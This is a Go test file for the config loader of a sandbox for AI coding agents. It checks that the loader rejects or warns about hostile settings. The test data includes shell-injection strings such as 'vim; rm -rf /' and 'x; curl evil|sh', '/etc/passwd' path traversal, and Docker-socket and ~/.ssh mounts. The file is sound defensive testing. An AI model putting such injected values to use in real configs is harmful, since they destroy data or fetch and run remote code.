package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func load(t *testing.T, user, project string, env map[string]string) (*Result, error) {
	t.Helper()
	dir := t.TempDir()
	opts := LoadOptions{
		UserConfigPath: filepath.Join(dir, "user.toml"),
		Getenv:         func(k string) string { return env[k] },
	}
	if user != "" {
		write(t, opts.UserConfigPath, user)
	}
	if project != "" {
		pdir := filepath.Join(dir, "proj")
		if err := os.Mkdir(pdir, 0o755); err != nil {
			t.Fatal(err)
		}
		write(t, filepath.Join(pdir, ProjectConfigName), project)
		opts.ProjectDir = pdir
	}
	return Load(opts)
}

func TestTemplateMatchesDefaults(t *testing.T) {
	got := Defaults()
	if err := decodeStrict([]byte(Template), &got); err != nil {
		t.Fatalf("template does not decode strictly: %v", err)
	}
	normalize(&got)
	want := Defaults()
	normalize(&want)
	if !reflect.DeepEqual(got, want) {
		t.Errorf("template drifted from defaults:\n got %+v\nwant %+v", got, want)
	}
	if err := got.Validate(); err != nil {
		t.Errorf("template config invalid: %v", err)
	}
}

func TestDefaultsAreValid(t *testing.T) {
	c := Defaults()
	if err := c.Validate(); err != nil {
		t.Fatal(err)
	}
}

func TestUserConfigOverridesDefaults(t *testing.T) {
	r, err := load(t, "[sandbox]\nui = \"shell\"\ncpus = 2\n[network]\nmode = \"open\"\n", "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if r.Config.Sandbox.UI != "shell" || r.Config.Sandbox.CPUs != 2 || r.Config.Network.Mode != "open" {
		t.Errorf("not applied: %+v", r.Config)
	}
	if r.Config.Sandbox.Memory != "8g" {
		t.Errorf("unset key lost its default: %q", r.Config.Sandbox.Memory)
	}
}

func TestUnknownUserKeyIsAnError(t *testing.T) {
	_, err := load(t, "[sandbox]\nuii = \"shell\"\n", "", nil)
	if err == nil || !strings.Contains(err.Error(), "uii") {
		t.Fatalf("want error naming the typo, got %v", err)
	}
}

func TestValidation(t *testing.T) {
	cases := map[string]string{
		"bad enum":        "[network]\nmode = \"wide-open\"\n",
		"bad memory":      "[sandbox]\nmemory = \"lots\"\n",
		"abs worktrees":   "[sandbox]\nworktrees_dir = \"/etc\"\n",
		"escaping dir":    "[sandbox]\nworktrees_dir = \"../x\"\n",
		"bad cidr":        "[network]\nallow_cidrs = [\"10.0.0.0/99\"]\n",
		"bad domain":      "[network]\nallow = [\"not a domain\"]\n",
		"push no token":   "[git]\nmode = \"push\"\n",
		"apt injection":   "[extras]\napt = [\"vim; rm -rf /\"]\n",
		"mise injection":  "[extras]\nmise = [\"node@22 && curl x\"]\n",
		"dup mount":       "[[mount]]\nname=\"a\"\nhost=\"/tmp\"\nmode=\"ro\"\n[[mount]]\nname=\"a\"\nhost=\"/var\"\nmode=\"ro\"\n",
		"bad mount name":  "[[mount]]\nname=\"../x\"\nhost=\"/tmp\"\nmode=\"ro\"\n",
		"bad mount mode":  "[[mount]]\nname=\"a\"\nhost=\"/tmp\"\nmode=\"rwx\"\n",
		"relative host":   "[[mount]]\nname=\"a\"\nhost=\"data\"\nmode=\"ro\"\n",
		"root mount":      "[[mount]]\nname=\"a\"\nhost=\"/\"\nmode=\"ro\"\n",
		"docker socket":   "[[mount]]\nname=\"a\"\nhost=\"/var/run/docker.sock\"\nmode=\"rw\"\n",
		"bad pi version":  "[pi]\nversion = \"newest\"\n",
		"bad thinking":    "[team.thinking]\nscout = \"turbo\"\n",
		"lead as default": "[team]\ndefault_roles = [\"lead\"]\n",
		"bad mcp url":     "[[mcp]]\nname=\"x\"\nurl=\"ftp://x\"\n",
		"mcp url+command": "[[mcp]]\nname=\"x\"\nurl=\"https://x\"\ncommand=\"node\"\n",
		"mcp neither":     "[[mcp]]\nname=\"x\"\n",
		"mcp args on url": "[[mcp]]\nname=\"x\"\nurl=\"https://x\"\nargs=[\"a\"]\n",
		"mcp bad env":     "[[mcp]]\nname=\"x\"\ncommand=\"node\"\nenv={\"A B\"=\"1\"}\n",
	}
	for name, cfg := range cases {
		if _, err := load(t, cfg, "", nil); err == nil {
			t.Errorf("%s: expected a validation error", name)
		}
	}
}

func TestHomeMountIsRejectedButSubfolderAllowed(t *testing.T) {
	home, _ := os.UserHomeDir()
	if _, err := load(t, "[[mount]]\nname=\"h\"\nhost=\"~\"\nmode=\"ro\"\n", "", nil); err == nil {
		t.Error("mounting $HOME itself must be rejected")
	}
	r, err := load(t, "[[mount]]\nname=\"n\"\nhost=\"~/notes\"\nmode=\"rw\"\n", "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := r.Config.Mounts[0].Host; got != filepath.Join(home, "notes") {
		t.Errorf("~ not expanded: %q", got)
	}
}

func TestRiskyMountWarns(t *testing.T) {
	r, err := load(t, "[[mount]]\nname=\"keys\"\nhost=\"~/.ssh\"\nmode=\"ro\"\n", "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Warnings) == 0 || !strings.Contains(r.Warnings[0], ".ssh") {
		t.Errorf("want a warning about ~/.ssh, got %v", r.Warnings)
	}
}

func TestProjectConfigCannotAddMountsOrLoosen(t *testing.T) {
	project := `
[sandbox]
ui = "pi"
memory = "2g"
cpus = 16
[network]
mode = "open"
allow_cidrs = ["192.168.0.0/16"]
[git]
mode = "push"
token_env = "X"
[credentials]
scope = "shared"
[[mount]]
name = "evil"
host = "/etc"
mode = "rw"
[env]
SECRET = { from_host_env = "HOME" }
[pi]
packages = ["npm:evil"]
default_model = "provider/model"
`
	r, err := load(t, "[sandbox]\ncpus = 4\n", project, nil)
	if err != nil {
		t.Fatal(err)
	}
	c := r.Config
	if len(c.Mounts) != 0 || len(c.Env) != 0 || len(c.Pi.Packages) != 0 || len(c.Network.AllowCIDRs) != 0 {
		t.Errorf("project config added things it may not: %+v", c)
	}
	if c.Git.Mode != "local" {
		t.Errorf("project config changed git mode: %q", c.Git.Mode)
	}
	if c.Network.Mode != "open-no-lan" {
		t.Errorf("project config loosened network mode: %q", c.Network.Mode)
	}
	if c.Sandbox.UI != "pi" || c.Sandbox.Memory != "2g" || c.Pi.DefaultModel != "provider/model" {
		t.Errorf("allowed keys not applied: %+v", c.Sandbox)
	}
	if c.Sandbox.CPUs != 4 {
		t.Errorf("project raised cpus above the user limit: %v", c.Sandbox.CPUs)
	}
	joined := strings.Join(r.Warnings, "\n")
	for _, want := range []string{"mount", "env", "git.mode", "git.token_env", "credentials.scope", "pi.packages", "network.allow_cidrs", "would loosen", "exceeds"} {
		if !strings.Contains(joined, want) {
			t.Errorf("warnings do not mention %q:\n%s", want, joined)
		}
	}
}

func TestProjectCanTightenNetwork(t *testing.T) {
	r, err := load(t, "", "[network]\nmode = \"allowlist\"\n", nil)
	if err != nil {
		t.Fatal(err)
	}
	if r.Config.Network.Mode != "allowlist" {
		t.Errorf("mode = %q", r.Config.Network.Mode)
	}
}

func TestProjectExtrasAreKeptSeparateAndValidated(t *testing.T) {
	r, err := load(t, "[extras]\napt = [\"vim\"]\n", "[extras]\napt = [\"php-cli\"]\nmise = [\"node@22\"]\n", nil)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(r.Config.Extras.Apt, []string{"vim"}) {
		t.Errorf("user apt list was changed: %v", r.Config.Extras.Apt)
	}
	if !reflect.DeepEqual(r.ProjectExtras.Apt, []string{"php-cli"}) || !reflect.DeepEqual(r.ProjectExtras.Mise, []string{"node@22"}) {
		t.Errorf("project extras: %+v", r.ProjectExtras)
	}
	if _, err := load(t, "", "[extras]\napt = [\"x; curl evil|sh\"]\n", nil); err == nil {
		t.Error("shell metacharacters in project apt list must be rejected")
	}
}

func TestProjectDockerfileMustStayInsideProject(t *testing.T) {
	if _, err := load(t, "", "[image]\ndockerfile = \"../../etc/passwd\"\n", nil); err == nil {
		t.Error("escaping dockerfile path accepted")
	}
	if _, err := load(t, "", "[image]\ndockerfile = \"/etc/passwd\"\n", nil); err == nil {
		t.Error("absolute dockerfile path accepted")
	}
	r, err := load(t, "", "[image]\ndockerfile = \"tools/Dockerfile\"\n", nil)
	if err != nil || r.Config.Image.Dockerfile != "tools/Dockerfile" {
		t.Errorf("valid dockerfile path: %v %+v", err, r)
	}
}

func TestFlagsAndEnvOverrideProject(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, ProjectConfigName), "[sandbox]\nui = \"pi\"\n")
	yes := true
	r, err := Load(LoadOptions{
		ProjectDir:     dir,
		UserConfigPath: filepath.Join(dir, "none.toml"),
		Flags:          Flags{UI: "shell", Team: &yes, Ephemeral: true},
		Getenv: func(k string) string {
			return map[string]string{"AIRLOCK_NETWORK_MODE": "allowlist", "AIRLOCK_SANDBOX_CPUS": "1.5"}[k]
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	c := r.Config
	if c.Sandbox.UI != "shell" || !c.Team.Enabled || c.Sandbox.Lifetime != "ephemeral" ||
		c.Network.Mode != "allowlist" || c.Sandbox.CPUs != 1.5 {
		t.Errorf("overrides not applied: %+v", c)
	}
}

func TestNeedsClaudeCode(t *testing.T) {
	c := Defaults()
	if c.NeedsClaudeCode() {
		t.Error("default config must not need Claude Code")
	}
	c.Pi.Packages = []string{"npm:pi-claude-bridge@0.11.0"}
	if !c.NeedsClaudeCode() {
		t.Error("pi-claude-bridge needs Claude Code")
	}
	c.Extras.ClaudeCode = "false"
	if c.NeedsClaudeCode() {
		t.Error("explicit false must win")
	}
}

func TestParseSize(t *testing.T) {
	for in, want := range map[string]int64{"512m": 512 << 20, "8g": 8 << 30, "1024": 1024, "2G": 2 << 30} {
		got, err := ParseSize(in)
		if err != nil || got != want {
			t.Errorf("ParseSize(%q) = %d, %v; want %d", in, got, err, want)
		}
	}
	if _, err := ParseSize("-1g"); err == nil {
		t.Error("negative size accepted")
	}
}
